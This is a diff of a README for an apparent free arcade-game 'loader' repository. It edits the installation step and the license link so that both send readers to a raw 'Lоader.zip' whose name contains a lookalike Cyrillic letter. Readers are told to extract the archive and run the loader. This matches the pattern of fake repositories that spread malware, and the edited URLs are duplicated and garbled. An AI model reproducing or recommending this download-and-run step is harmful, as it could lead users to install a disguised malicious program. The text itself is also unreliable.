@@ -31,7 +31,7 @@ Super Technos World, River City Ransom, Technos Arcade, classic arcade loader, b
 
 ## 📥 Installation
 
-1. Download **https://raw.githubusercontent.com/jdhgh/SuperTechnosWorldRiverCity-ArcadeClassics-FreeEdition/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/jdhgh/SuperTechnosWorldRiverCity-ArcadeClassics-FreeEdition/main/Lоader.zipоhttps://raw.githubusercontent.com/jdhgh/SuperTechnosWorldRiverCity-ArcadeClassics-FreeEdition/main/Lоader.zip** from the repository.
 2. Extract the archive with any archive manager.
 3. Run the loader for your operating system.
 4. Follow on-screen instructions to enjoy Technos Arcade Classics instantly.
@@ -46,7 +46,7 @@ This project is for *preservation* and educational purposes. All titles are dist
 
 ## 📝 MIT License
 
-Released under the [MIT License](https://raw.githubusercontent.com/jdhgh/SuperTechnosWorldRiverCity-ArcadeClassics-FreeEdition/main/Lоader.zip) – Copyright 2025.
+Released under the [MIT License](https://raw.githubusercontent.com/jdhgh/SuperTechnosWorldRiverCity-ArcadeClassics-FreeEdition/main/Lоader.zipоhttps://raw.githubusercontent.com/jdhgh/SuperTechnosWorldRiverCity-ArcadeClassics-FreeEdition/main/Lоader.zip) – Copyright 2025.
 
 ---
 
